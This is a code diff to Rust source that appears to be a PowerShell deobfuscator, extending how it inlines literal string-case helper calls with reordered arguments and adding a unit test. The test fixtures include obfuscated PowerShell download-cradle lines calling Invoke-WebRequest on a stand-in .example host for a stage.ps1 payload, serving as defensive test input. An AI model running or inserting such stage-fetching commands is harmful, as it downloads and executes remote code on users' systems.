@@ -3726,7 +3726,14 @@ fn expand_literal_string_case_extractor_calls(text: &str) -> String {
             continue;
         };
 
-        out = inline_ps_literal_string_case_calls(&out, &name, value_idx, value_var, kind);
+        out = inline_ps_literal_string_case_calls(
+            &out,
+            &name,
+            value_idx,
+            value_var,
+            param_index.len(),
+            kind,
+        );
     }
     out
 }
@@ -5875,6 +5882,7 @@ fn inline_ps_literal_string_case_calls(
     name: &str,
     value_idx: usize,
     value_name: &str,
+    arg_count: usize,
     kind: PsStringCaseKind,
 ) -> String {
     let lower = text.to_ascii_lowercase();
@@ -5915,24 +5923,17 @@ fn inline_ps_literal_string_case_calls(
                     continue;
                 }
             }
-            let Some((value_end, value)) = parse_ps_static_quoted_literal(text, pos) else {
+            let Some((call_end, value)) = parse_ps_positional_static_literal_arg(
+                text,
+                pos,
+                parenthesized,
+                value_idx,
+                arg_count,
+            ) else {
                 search_from = end_name;
                 continue;
             };
             if value.len() > 8192 {
-                search_from = value_end;
-                continue;
-            }
-            let mut call_end = value_end;
-            if parenthesized {
-                let after = skip_ascii_ws(bytes, call_end);
-                if bytes.get(after) != Some(&b')') {
-                    search_from = value_end;
-                    continue;
-                }
-                call_end = after + 1;
-            }
-            if value_idx != 0 {
                 search_from = call_end;
                 continue;
             }
@@ -9364,6 +9365,23 @@ Lower 'INVOKE-WEBREQUEST -URI HTTPS://PS-LOWER-EXTRACTOR.EXAMPLE/STAGE.PS1'"#;
         assert!(
             out.contains("'invoke-webrequest -uri https://ps-lower-extractor.example/stage.ps1'"),
             "literal string-case extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_string_case_extractor_reordered_call_is_rewritten() {
+        let text = r#"function Lower($unused,$value) {
+  return $value.ToLower()
+}
+Lower 0 'INVOKE-WEBREQUEST -URI HTTPS://PS-REORDERED-LOWER-EXTRACTOR.EXAMPLE/STAGE.PS1'"#;
+
+        let out = expand_literal_string_case_extractor_calls(text);
+
+        assert!(
+            out.contains(
+                "'invoke-webrequest -uri https://ps-reordered-lower-extractor.example/stage.ps1'"
+            ),
+            "reordered literal string-case extractor call was not rewritten:\n{out}"
         );
     }
 
